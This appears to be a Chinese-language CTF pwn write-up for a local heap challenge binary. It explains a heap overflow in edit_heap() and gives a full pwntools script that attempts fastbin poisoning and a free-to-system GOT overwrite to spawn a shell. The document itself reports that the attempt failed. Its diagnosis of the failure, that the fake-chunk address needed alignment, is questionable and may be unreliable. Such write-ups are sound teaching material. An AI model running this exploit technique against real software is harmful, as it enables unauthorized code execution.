# 漏洞利用文档

## 执行环境
基于提供的反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，无PIE保护（地址固定，如heaparray地址0x6020e0）
- **保护机制**：从exp上下文推断，可能无ASLR或部分启用（堆地址固定），但栈保护（Canary）存在（反编译代码中可见`__readfsqword(0x28u)`）
- **依赖库**：依赖libc（exp中使用`elf.libc`），动态链接（ldd结果类似：libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6）
- **运行需求**：Linux环境，需pwntools工具链，程序路径为`./data/sample17`，flag文件位于`/home/pwn/flag`
- **关键功能**：堆管理程序，提供创建、编辑、删除堆块功能，存在隐藏函数`l33t()`用于读取flag

## 漏洞成因
### 关键结构体分析
- **heaparray**：全局指针数组（地址0x6020e0），存储10个堆块指针，索引0-9
- **堆块结构**：每个堆块包含元数据（size）和用户数据区，大小由用户指定
- **magic变量**：全局变量（地址0x6020c0），需值>0x1305才能触发`l33t()`

### 漏洞分析
**漏洞类型**：堆溢出（Heap Overflow）
**根本原因**：`edit_heap()`函数未验证输入大小与原始分配大小的一致性：
- 在`edit_heap()`中，用户可指定任意大小的数据写入堆块（`read_input(*(&heaparray + v1), v2)`）
- 当`v2`（用户输入大小）大于原始分配大小时，导致溢出相邻堆块元数据
- 结合反编译代码和调试记录，Step 3中通过编辑chunk1覆盖chunk2的fd指针，证实了溢出漏洞

**利用条件**：连续堆布局允许溢出影响相邻堆块，fastbin机制便于实现任意地址写。

## 漏洞利用过程
基于exp步进调试，内存状态变化如下表所示（关键聚焦堆布局和全局变量）：

| 步骤 | 操作 | 堆布局变化 | heaparray状态 | 关键内存地址变化 | 利用效果 |
|------|------|------------|---------------|------------------|----------|
| Step 1 | `add(0x68,b'6')` x3 | 分配三个0x71大小堆块：Chunk0(0x25fcd010)、Chunk1(0x25fcd080)、Chunk2(0x25fcd0f0) | [0]=0x25fcd010, [1]=0x25fcd080, [2]=0x25fcd0f0 | magic=0x0 | 初始化堆布局，为溢出提供基础 |
| Step 2 | `free(2)` | Chunk2释放进入fastbin（fd=0x0） | [2]=0x0 | fastbin: 0x25fcd0e0→0x0 | 创建空闲块，用于fastbin攻击 |
| Step 3 | `edit(1,...)` | 溢出Chunk1覆盖Chunk2的fd为0x6020ad | [1]内容变为"/bin/sh"+填充+0x71+0x6020ad | Chunk2fd=0x6020ad | 实现堆溢出，篡改fastbin链表 |
| Step 4 | `add(0x68,b'6')` x2 | 第一次分配取回Chunk2，第二次分配尝试伪造chunk失败（SIGSEGV） | [2]=0x25fcd0f0, [3]=0x0 | 伪造chunk地址0x6020ad无效 | 利用失败：伪造chunk结构无效 |
| Step 5-7 | 后续操作 | 程序崩溃，GOT覆盖未执行 | 状态不变 | free@got未修改，magic=0x0 | 利用链中断 |

### 内存变化关键点
- **堆溢出偏移**：从Chunk1数据区(0x25fcd080)到Chunk2 fd指针(0x25fcd0f0)距离0x70字节
- **利用目标**：通过覆盖GOT（free→system）或修改magic变量触发`l33t()`
- **失败原因**：伪造chunk地址0x6020ad未对齐（应使用0x6020b0），且size字段不匹配（0x7d vs 0x71）

## Exploit
以下是漏洞利用脚本，在关键位置添加注释说明：

```python
from pwn import *
context.log_level = 'debug'  # 启用调试输出
context.terminal = ['tmux', 'splitw', '-h']  # 设置终端用于调试
p = process('./data/sample17')  # 启动目标程序
elf = ELF('./data/sample17')   # 加载ELF文件
libc = elf.libc  # 获取libc基址

# 定义辅助函数简化操作
n2b = lambda x    : str(x).encode()
rv  = lambda x    : p.recv(x)
ru  = lambda s    : p.recvuntil(s)
sd  = lambda s    : p.send(s)
sl  = lambda s    : p.sendline(s)
sn  = lambda n    : sl(n2b(n))
sa  = lambda t, s : p.sendafter(t, s)
sla = lambda t, s : p.sendlineafter(t, s)
sna = lambda t, n : sla(t, n2b(n))
ia  = lambda      : p.interactive()
rop = lambda r    : flat([p64(x) for x in r])

def add(size,content):
    sla(':','1')  # 选择创建堆块
    sla(':',str(size))  # 输入大小
    sla(':',content)   # 输入内容

def edit(idx, content):
    sla(':','2')  # 选择编辑堆块
    sla(':',str(idx))  # 输入索引
    sla(':',str(len(content)))  # 输入大小（漏洞点：可任意指定）
    sla(':',content)   # 输入内容（可能溢出）

def free(idx):
    sla(':','3')  # 选择删除堆块
    sla(':',str(idx))  # 输入索引

# Step 1: 分配三个堆块，建立连续堆布局
add(0x68,b'6');add(0x68,b'6');add(0x68,b'6')  # 分配大小0x68（实际chunk大小0x71）

# Step 2: 释放第三个堆块，进入fastbin
free(2)  # 释放index 2，fd指针初始为0x0

# Step 3: 利用堆溢出覆盖第二个堆块，修改空闲块的fd指针
# 构造payload: "/bin/sh"字符串 + 填充 + 伪造size + 伪造fd指针
edit(1, b'/bin/sh\x00' + b'\x00'*0x60 + p64(0x71) + p64(0x6020ad))
# 目的：将fastbin链表指向伪造地址0x6020ad（实际应使用0x6020b0以正确对齐）

# Step 4: 重新分配，尝试获取伪造chunk
add(0x68,b'6')  # 取回原Chunk2
add(0x68,b'6')  # 尝试分配伪造chunk（此处失败，因地址无效）

# Step 5: 计划编辑伪造chunk覆盖GOT，但分配失败导致无效
edit(3, b'\x00'*0x23 + p64(elf.got['free']))  # 尝试覆盖free的GOT（未执行）

# Step 6: 计划覆盖Chunk0内容为system地址，但利用链已中断
edit(0, p64(elf.plt['system']))  # 尝试写入system的PLT地址（未成功）

# Step 7: 触发system("/bin/sh")，但因前期失败未执行
free(1)  # 原计划释放包含"/bin/sh"的块，调用system("/bin/sh")

ia()  # 交互模式（实际未触发）
```

### 利用脚本注释说明
- **关键漏洞利用点**：Step 3中的堆溢出是核心，通过覆盖fd指针实现任意地址分配。
- **失败修正建议**：伪造chunk地址应改为`0x6020b0`（对齐地址），并确保该处内存预先写入有效的chunk结构（size=0x71）。
- **替代方案**：若fastbin攻击失败，可考虑使用unsortedbin攻击或修改magic变量直接触发`l33t()`。
